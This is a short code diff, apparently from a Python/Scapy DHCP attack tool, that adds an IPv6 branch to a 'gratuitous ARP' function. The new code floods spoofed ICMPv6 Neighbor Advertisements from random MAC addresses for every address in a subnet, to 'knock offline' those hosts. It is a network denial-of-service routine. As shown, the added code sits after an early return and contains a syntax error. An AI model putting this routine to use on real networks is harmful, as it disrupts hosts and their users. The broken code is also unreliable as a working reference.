@@ -268,6 +268,16 @@ def garp():
     global dhcpsip,subnet
     if MODE_IPv6:
         print "[ !! ] IPv6 - gratious_arp() not supported at this point "
+        return
+        pool=Net6(dhcpsip+"/"calcCIDR(subnet))
+        for ip in pool:
+            m=randomMAC()
+            # craft packet  Ether/IPv6/ICMPv6_ND_NA/ICMPv6NDOptDstLLAddr
+            LL_ScopeALL_Multicast_Address="ff02::1"
+            arpp = Ether(src=m,dst="33:33:00:00:00:01")/IPv6(src=ip,dst=LL_ScopeALL_Multicast_Address)/ICMPv6ND_NA(tgt=ip,R=0)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
+            sendPacket(arpp)
+            print "[===>] v6_ICMP_NeighborDiscovery - knock offline  %s"%ip
+            if conf.verb: print "%r"%arpp
     else:
         pool=Net(dhcpsip+"/"+calcCIDR(subnet))
         for ip in pool:
